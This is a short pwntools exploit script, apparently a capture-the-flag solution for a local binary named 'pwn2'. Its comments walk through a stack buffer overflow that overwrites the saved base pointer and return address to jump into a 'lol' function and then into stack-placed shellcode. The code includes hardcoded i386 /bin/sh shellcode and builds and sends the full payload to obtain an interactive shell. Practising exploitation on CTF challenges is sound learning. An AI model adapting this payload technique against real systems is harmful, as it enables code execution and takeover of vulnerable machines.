#Here we have to inject and execute shellcode to open a shell.
#So we can see that there is a function named lol, we need to
#jump there and using the jmp instruction in it, jumping to
#the stack where we will place the shellcode.
#Steps:
#1. find if there is padding (file with instruction in CyberChallenges dir)
#2. find the size of the padding
#3. we need to fill up the buffer variable, the padding, the base pointer
#4. Then put the address of the lol function
#5. BUT if you look at the code of the lol function, you will notice that
# it execute a push of ebp on the stack, we need to bypass that too
#6. so we fill up also that base pointer and then we put the shellcode
#7. and BOOM! here is the shell

#!/bin/python3

from pwn import *

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
shellcode1 = asm(shellcraft.i386.sh())

address = p32(ELF("./pwn2").symbols["lol"])
#print(address)

basePointer = b'a' * 4

padding = b'a' * 8

buffer = b'a' * 32

msg = buffer + padding + basePointer + address + basePointer + shellcode1
p = process("./pwn2")
p.sendline(msg)
p.interactive()
